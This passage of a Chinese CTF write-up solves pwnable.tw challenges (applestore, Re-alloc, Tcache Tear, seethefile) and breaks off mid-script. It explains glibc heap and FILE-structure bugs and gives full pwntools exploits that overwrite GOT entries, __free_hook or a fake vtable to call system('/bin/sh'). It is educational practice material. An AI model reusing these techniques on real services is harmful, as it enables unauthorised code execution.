<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(arch='i386', os='linux', log_level='debug')</span></span><br><span class="line">elf = ELF(<span class="string">"./applestore"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc_32.so.6"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/i386-linux-gnu/libc.so.6")</span></span><br><span class="line"><span class="comment"># p = elf.process()</span></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10104</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Device Number&gt; "</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Item Number&gt; "</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cart</span>(<span class="params">con</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Let me check your cart. ok? (y/n) &gt; "</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span>(<span class="params">con</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Let me check your cart. ok? (y/n) &gt; "</span>, con)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">info(<span class="string">"atoi_got:"</span> + <span class="built_in">hex</span>(atoi_got))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">	add(<span class="number">2</span>)</span><br><span class="line">checkout(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'y\x00'</span> + p32(atoi_got) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)</span><br><span class="line">cart(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"27: "</span>)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">libc.address = libc_base</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">environ = libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line">info(<span class="string">"environ:"</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line">info(<span class="string">"libc_base:"</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">info(<span class="string">"system:"</span> + <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'y\x00'</span> + p32(environ) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)</span><br><span class="line">cart(payload)</span><br><span class="line">p.recvuntil(<span class="string">"27: "</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x104</span></span><br><span class="line">info(<span class="string">"ebp_addr:"</span> + <span class="built_in">hex</span>(ebp))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'27'</span> + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(atoi_got + <span class="number">0x22</span>) + p32(ebp - <span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">delete(payload)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, p32(system) + <span class="string">";\bin\sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="0x09-Re-alloc"><a href="#0x09-Re-alloc" class="headerlink" title="0x09 Re-alloc"></a>0x09 Re-alloc</h2><p><code>I want to realloc my life :)</code></p>
<p>修改ELF文件头，改变动态加载器、libc以及符号表为libc2.29版本</p>
<p>关于realloc函数，根据size的不同可以有多种功能</p>
<ol>
<li><code>ptr == 0</code>: malloc(size)</li>
<li><code>ptr != 0 &amp;&amp; size == 0</code>: free(ptr)</li>
<li><code>ptr != 0 &amp;&amp; size == old_size</code>: edit(ptr)</li>
<li><code>ptr != 0 &amp;&amp; size &lt; old_size</code>: edit(ptr) and free(remainder)</li>
<li><code>ptr != 0 &amp;&amp; size &gt; old_size</code>: new_ptr = malloc(size); strcpy(new_ptr, ptr); free(ptr); return new_ptr; </li>
</ol>
<p>所以利用思路是：</p>
<ul>
<li>利用uaf在tcache不同size的链表中放置一个<code>atoll_got</code>的chunk</li>
<li>利用其中一个指向<code>atoll_got</code>的chunk更改<code>atoll_got</code>为<code>printf_plt</code>，这样在调用<code>atoll</code>时，就会调用<code>printf</code>从而构造出一个格式化字符串漏洞，利用这个漏洞可以leak出栈上的libc地址，这里选择leak<code>__libc_start_main</code>。</li>
<li>利用另一个指向<code>atoll_got</code>的chunk将<code>atoll_got</code>再改成<code>system</code>，注意因为此时<code>atoll</code>是<code>printf</code>，所以在调用alloc时，需要输入的Index和Size不是直接输入数字，而是通过输入的string的长度来通过printf返回的值间接传给Index和Size。</li>
<li>最后再输入<code>/bin/sh\x00</code>调用<code>atoll</code>来执行<code>system("/bin/sh");</code>getshell即可。</li>
</ul>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = remote("chall.pwnable.tw", 10106)</span></span><br><span class="line">elf = ELF(<span class="string">"./re-alloc"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.29.so"</span>)</span><br><span class="line">p = elf.process()</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index:"</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index:"</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	<span class="keyword">if</span> size!=<span class="number">0</span>:</span><br><span class="line">		p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">		p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Index:"</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,<span class="string">''</span>) <span class="comment"># free</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,p64(<span class="number">0x404048</span>)) <span class="comment"># chunk0 -&gt; atoll_got()  tcache[0x20]</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment"># clear heap[0],heap[1]</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'a'</span>*<span class="number">8</span>) <span class="comment"># chunk0 -&gt; 0x38  tcache[0x40]</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x38</span>,<span class="string">'b'</span>*<span class="number">0x10</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#again</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">'a'</span>*<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,<span class="string">''</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x48</span>,p64(<span class="number">0x404048</span>))<span class="comment"># chunk0 -&gt; atoll_got()  tcache[0x50]</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x48</span>,<span class="string">'a'</span>*<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x58</span>,<span class="string">'a'</span>*<span class="number">8</span>)<span class="comment"># chunk0 -&gt; 0x38  tcache[0x60]</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x58</span>,<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>,p64(<span class="number">0x00401070</span>))<span class="comment"># plt_printf</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Index:"</span>)</span><br><span class="line">p.sendline(<span class="string">'%paaa%pbbb%p'</span>)</span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line">p.recvuntil(<span class="string">'bbb'</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x12e009</span></span><br><span class="line">info(<span class="string">"libc: "</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>+<span class="string">'\x00'</span>)<span class="comment"># idx = 1</span></span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(<span class="string">'%15c'</span>)<span class="comment"># size = 15</span></span><br><span class="line">p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">p.send(p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice: "</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Index:"</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="0x0A-Tcache-Tear"><a href="#0x0A-Tcache-Tear" class="headerlink" title="0x0A Tcache Tear"></a>0x0A Tcache Tear</h2><p>查到该题目libc版本为2.27-3ubuntu1_amd64，该版本的tcache检查机制较少，可以利用double free进行地址任意写。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v4 &lt;= <span class="number">7</span> )</span><br><span class="line">{</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ++v4;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>free后没有将指针清空，存在UAF漏洞，利用方法是在可写的bss段构造一个size大于tcache的fake chunk，然后free，使其进入unsorted bin，泄露出libc基址。进而再次利用任意地址写修改libc中可用的函数指针，最终getshell。</p>
<p>这里需要注意的是，tcache使用 64 个单链表结构的 bins，每个 bins 最多存放 7 个 chunk，64位程序tcache最大为0x408，因此需要伪造大于0x408大小才能放入unsorted bin，并且伪堆块后面的数据也要满足基本的堆块格式，而且至少两块，因此free时，会对当前的堆块进行一系列检查</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 _int_free 函数中</span></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) {</span><br><span class="line">  <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到free函数对当前的堆块的nextchunk也进行了相应的检查，并且还检查了nextchunk的inuse位，这一位的信息在nextchunk的nextchunk中，所以在这里我们总共要伪造三个堆块。第一个堆块我们构造大小为0x500，第二个和第三个分别构造为0x20大小的堆块，这些堆块的标记位，均为只置prev_inuse为1，使得free不去进行合并操作。</p>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line"><span class="comment"># exe = context.binary = ELF('./test')</span></span><br><span class="line">elf=ELF(<span class="string">'./tcacher'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/root/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6'</span>)</span><br><span class="line">exe = <span class="string">'./tcacher'</span> arg1 = <span class="string">''</span>; arg2 = <span class="string">''</span> </span><br><span class="line">host = <span class="string">'chall.pwnable.tw'</span></span><br><span class="line">port = <span class="number">10207</span></span><br><span class="line"><span class="keyword">if</span> args.I:</span><br><span class="line">    context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">local</span>():</span></span><br><span class="line">    <span class="keyword">return</span> process(argv = [exe,arg1,arg2])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remote</span>():</span></span><br><span class="line">    <span class="keyword">return</span> connect(host, port)</span><br><span class="line">start = remote <span class="keyword">if</span> args.R <span class="keyword">else</span> local</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m    : io.recv(numb=m)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#==================================================</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    sla(<span class="string">"Your choice :"</span> , <span class="string">'1'</span>)</span><br><span class="line">    sla(<span class="string">"Size:"</span> , <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">"Data:"</span> , data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>():</span></span><br><span class="line">    sla(<span class="string">"Your choice :"</span> , <span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sla(<span class="string">"Your choice :"</span> , <span class="string">'3'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    sla(<span class="string">"Your choice :"</span> , <span class="string">'4'</span>)</span><br><span class="line">name = <span class="number">0x0000000000602060</span></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">sla(<span class="string">"Name:"</span> , p64(<span class="number">0</span>) + p64(<span class="number">0x501</span>))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'a'</span>*<span class="number">24</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x50</span>,p64(name+<span class="number">0x500</span>))</span><br><span class="line">add(<span class="number">0x50</span>,p64(name+<span class="number">0x500</span>))</span><br><span class="line">add(<span class="number">0x50</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)*<span class="number">2</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x60</span>,p64(name+<span class="number">0x10</span>))</span><br><span class="line"><span class="comment"># add(0x60,'a')</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"ld1ng"</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"ld1ng"</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">ru(p64(<span class="number">0x501</span>))</span><br><span class="line">libc_base = uu64(re(<span class="number">6</span>))-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">og = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">rce = libc_base + og[<span class="number">1</span>]</span><br><span class="line">info(<span class="string">"libc_base: "</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">info(<span class="string">"free_hook: "</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">info(<span class="string">"rce: "</span> + <span class="built_in">hex</span>(rce))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">'a'</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x70</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">"ld1ng"</span>)</span><br><span class="line">add(<span class="number">0x70</span>,p64(rce))</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">"test"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>

<h2 id="0x0B-seethefile"><a href="#0x0B-seethefile" class="headerlink" title="0x0B seethefile"></a>0x0B seethefile</h2><p>glibc2.23 ，题目实现了标准的open read write 的流程，但是通过限制文件名禁止读flag文件，漏洞点name和fp都是bss段数据，且相距很近，在退出时，输入name可以造成溢出覆盖到fp</p>
<p><img src="https://files.catbox.moe/n3dih2.png" alt="image-20221124171057860"></p>
<p><img src="https://files.catbox.moe/sy9dd5.png"></p>
<p>建议学习<a target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/IO_FILE_fclose_analysis">raycp大佬博客</a>，包括fread，fopen，fwrite，fclose的源码分析。</p>
<p>这里的利用方法是伪造fake FILE，使得fclose时调用system。</p>
<p>libc的泄漏很简单，利用linux的proc伪文件系统读取<code>/proc/self/maps</code>即可获得libc基址，一次最多只能读取0x18f个字节，所以可以read两次，将其打印出来。</p>
<p>一般我们读取的是/proc/[pid]/maps，可以获取任意进程的映射信息，这里我们使用self是为了获取当前进程的内存映射关系</p>
<p>当读入一个文件后，_IO_list_all便指向当前fp，fclose之后，就指回sterr。</p>
<p><img src="https://files.catbox.moe/yxjzvh.png" alt="image-20221124172951035"></p>
<p>fclose的核心部分由_IO_new_fclose完成，一共分为三个部分，代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">  ... </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);<span class="comment">//将fp从_IO_list_all链表中取下</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);  <span class="comment">//关闭文件，并释放缓冲区。</span></span><br><span class="line">  ...</span><br><span class="line">  _IO_FINISH (fp);  <span class="comment">//确认FILE结构体从链表中删除以及缓冲区被释放</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    {</span><br><span class="line">      fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>_IO_IS_FILEBUF为0x2000，_flags&amp;0x2000为0就会直接调用_IO_FINSH(fp)，_IO_FINSH(fp)相当于调用fp-&gt;vtable-&gt;_finish(fp)</p>
<p>将fp指向一块内存p，p偏移0的前4个字节设置为0xffffdfff，p偏移4的位置放上参数’;/bin/sh’；p偏移sizeof(_IO_FILE)大小位置(vtable)覆盖为内存q，32位程序vtable偏移为0x98，q的2*4字节处(vtable-&gt;_finish)覆盖为system即可。</p>
<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#==================================================</span></span><br><span class="line">io = start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">openf</span>(<span class="params">file</span>):</span></span><br><span class="line">    sla(<span class="string">":"</span>,<span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">":"</span>,file)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 